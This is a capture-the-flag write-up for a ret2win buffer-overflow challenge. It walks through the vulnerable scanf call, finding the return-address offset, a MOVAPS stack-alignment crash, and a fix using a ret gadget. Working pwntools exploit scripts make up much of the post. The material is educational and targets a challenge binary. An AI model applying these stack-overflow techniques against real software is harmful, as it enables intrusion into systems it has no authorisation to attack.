This was one of the easier pwn challenges from Full Weak Engineer CTF 2025, but
the thing that tripped me up was a stack alignment crash that has nothing
to do with the overflow itself, and the fix is a single gadget that looks like
it does nothing.

## TLDR

Simple stack buffer overflow into a win function (ret2win). A MOVAPS stack-misalignment
crash meant I had to drop a `ret` gadget in between the padding and the
flag function's address so the stack lined up on a 16-byte boundary before the
call.

## The challenge

There's no description on this one. You just get a download link to a `/dist`
folder with two helpful files: `main.c` and the compiled `main` binary.

Opening up `main.c`, the vulnerability pops out immediately:

```c
void flag(){   // <-- the function we need to run
  ...
}

int main(void){
  char buf[16];
  printf("I will receive a message and do nothing else:");
  scanf("%s", buf);
  return 0;
}
```

So this is a plain buffer overflow. `scanf("%s", buf)` reads input into a
16-byte buffer with no bounds checking at all, which means we can write past
the end of `buf`, overwrite the saved return address, and point execution
wherever we want. Where we want is `flag()`.

## Finding the offset

First I needed to know how many bytes it takes to reach the return address.
Using `gdb-peda` I generated a 100-character cyclic pattern, fed it in, and
looked at where it crashed. The offset came out to **24**.

## First attempt (and the crash)

My first try was the obvious one: 24 bytes of padding to fill up to the return
address, then the address of `flag()`.

```python
from pwn import *

p = process('./main')

flag_addr = 0x401810

payload  = b'A' * 24
payload += p64(flag_addr)

# wait until the program finishes printing its prompt, so we don't send
# anything early and break the exploit
p.sendlineafter(b":", payload)

print(p.recvall())
```

This did *not* work. Instead of a flag I got a SIGSEGV. The return address was
clearly being overwritten correctly (we were landing in `flag`), so something
inside the function was crashing.

## The MOVAPS issue

I googled the crash and found an article called
[The Infamous MOVAPS issue](https://pwn.elmo.sg/miscellaneous/movaps-issue.html),
which describes this exact situation.

Running `disas flag` in gdb showed the function uses `movaps` instructions,
which matches the article:

> When the source or destination operand is a memory operand, the operand must
> be aligned on a 16-byte (0x10) boundary or a general-protection exception
> (#GP) is generated.

In plain terms: `movaps` only works when the stack pointer is aligned to a
multiple of 0x10. When I go straight into `flag`, RSP was off by 8, so the
first `movaps` blew up with the #GP that showed up as my SIGSEGV. The overflow
was fine, but the alignment was the problem.

## The fix: a ret gadget

The fix from the article is almost funny. You stick a bare `ret` gadget into
the chain before the address of `flag`. When that `ret` executes it pops one
8-byte value off the stack, which nudges RSP by 8 and lines it back up on a
16-byte boundary. Then it returns straight into `flag` with the stack aligned.

To find a `ret` gadget I just ran ropper and searched for one:

```bash
ropper --file main --search ret
```

Out of that output I grabbed `0x0000000000401016: ret;`.

## Final exploit

Dropping that gadget in between the padding and `flag_addr` gives the working
chain (my pwntools is nothing fancy, there are cleaner ways to write this):

```python
from pwn import *

p = process('./main')

flag_addr  = 0x401810
ret_gadget = 0x401016   # bare ret, for stack alignment

payload  = b'A' * 24
payload += p64(ret_gadget)   # realign the stack to 0x10
payload += p64(flag_addr)

p.sendlineafter(b":", payload)

print(p.recvall())
```

To actually pull the flag you had to run it against the remote instance over
netcat, not the local binary. Just swap the `process('./main')` line for:

```python
p = remote('challenge.address', port)
```

with the real address and port the challenge gave you.

## Takeaway

The main thing I learned from this challenge was that successfully overwriting the return address doesn't necessarily mean the exploit will work. I initially assumed the issue was with my payload, but the return address was correct, and the crash was happening inside flag() rather than at the point of control flow hijacking. The actual problem was how I was entering the function. Returning directly into flag() doesn't set up the stack the same way a normal function call would, which can cause issues with stack alignment. It's something I'll keep in mind when debugging future ROP chains, especially when the program crashes after reaching the intended address.
